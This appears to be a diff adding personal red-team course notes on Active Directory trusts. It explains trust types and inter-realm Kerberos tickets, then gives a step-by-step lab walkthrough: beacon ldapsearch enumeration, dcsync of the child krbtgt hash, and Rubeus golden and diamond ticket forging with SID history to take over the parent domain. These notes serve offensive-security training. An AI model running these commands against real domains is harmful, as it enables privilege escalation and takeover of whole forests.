@@ -1,0 +1,83 @@
+TRUSTS
+The purpose of a trust is to allow one forest or domain to share its resources with another.  Trusts can exist between domains in the same forest, between domains in different forests, and even between entire forests.
+
+Parent/Child Trust
+- A two-way, transitive trust that is automatically created when a new domain is added to an existing tree.
+
+Tree-Root Trust
+- A two-way, transitive trust that is automatically created when a new domain tree is added to an existing forest.
+
+External Trust
+- A one or two-way, non-transitive trust that enables resources to be shared between domains in different forests.
+
+Forest Trust
+- A one or two-way transitive trust that enables resources to be shared between different forests.
+--------------------------------
+
+Trusted domains: trust information stored in active directory Trusted Domain object (TDO). (Trust type, transitivity, and shared password used to create it. Password rotates every 30 days. TDO's can be read.
+
+beacon> ldapsearch (objectClass=trustedDomain)
+- Find trusts
+
+Inter-Realm Tickets (referal tickets)
+
+Client --> TGS-REQ to its own KDC, The request includes:
+- Real: <--Trusted Domain
+-SNameString; TERMSERV
+sNameString: par-jmp.partner <-- Trusting realm.
+
+Returns a TGS-REP containig an inter realm TGT, from trusted realm but is encrypted using shared inter-relm key instead of KRBTGT
+TGT comes back
+- Realm<-- trusted realm
+- SPN
+-- SNameString: krbgt
+-- SnameString: Partner.com <-- trusting realm.
+client  uses inter-realm tgt to send another TGS-REQ This time directly to the trusting realm.
+
+Can see with: ldapsearch (samAccountType=805306370) --attributes samAccountName
+--------------------------------------------------------
+
+Parent / Child Trusts: can create a golden ticket to own all domains.
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
+- aes child domain aes256
+user is who we want to impersonate
+domain is child domain
+sid of the child domain
+sids list of sids you want in ticket sid history
+
+You can get the parent's domain SID via LDAP by querying a domain controller within that domain.  Make sure to set the query base to that of the parent domain's distinguished name.
+
+beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
+​
+Or it can be created using the diamond technique:
+beacon> exexecute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
+
+/tgtdeleg gets a usable TGT for the current user.
+/ticketuser is the user you want to impersonate.
+/ticketuserid is the RID of the impersonated user.
+/sids is a list of SIDs you want in the ticket's SID history.
+/krbkey is the AES256 hash of the child domain's krbtgt account. 
+
+PARENT CHILD TRUST LAB (High Integrity beacon)
+1 - Enumerate trust:  ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+2 - Obtain the aes25 hash for child domain krbtgt account:  dcsync child.parent.com Child\krbtgt <--domain
+--- 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
+3 - Obtain domain sid for child: ldapsearch (objectClass=domain) --attributes objectSid
+-- objectSid: S-1-5-21-690277740-3036021016-2883941857
+4 - Obtain Domain Sid for Parent: ldapsearch (objectClass=domain) --attributes objectSid --hostname domain_controller.domain.com --dn DC=domain,DC=com
+-- objectSid: S-1-5-21-3926355307-1661546229-813047887
+5 - Forge Golden ticket on Attacker desktop
+-- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:child.domain.com /sid:[child SID] /sids:[Parent SID] /aes256:[CHILD KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden
+-- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\rev
+6- Inject ticket into Beacon: 
+-- kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
+7- run klist
+8 - Access parent dc
+-- ls \\lon-dc-1\c$
+
+
+
+
+Enumerate trust:  
+Enumerate trust:  
+
